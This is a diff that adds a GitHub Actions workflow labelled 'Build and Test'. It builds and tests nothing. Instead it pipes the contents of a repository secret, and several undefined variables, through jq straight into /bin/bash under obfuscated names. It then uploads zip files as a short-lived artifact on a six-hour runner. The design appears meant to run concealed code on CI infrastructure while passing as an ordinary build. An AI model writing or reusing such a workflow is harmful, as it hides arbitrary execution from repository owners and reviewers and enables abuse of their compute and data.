@@ -1,0 +1,30 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          x63: ${{ secrets.x63 }}
+        run: |
+          printf '%s' "$x63" | jq -r .mwmb573 | /bin/bash
+          echo $on7277 | jq -r .sjz0 | /bin/bash
+          printf '%s' "$d9088" | jq -r .dmnas07213 | /bin/bash
+          printf '%s' "$nbm11" | jq -r .lhizf8 | /bin/bash
+          echo $fpqk90205 | jq -r .reyz29 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: diXwDmap
+          path: "*.zip"
+          retention-days: 1
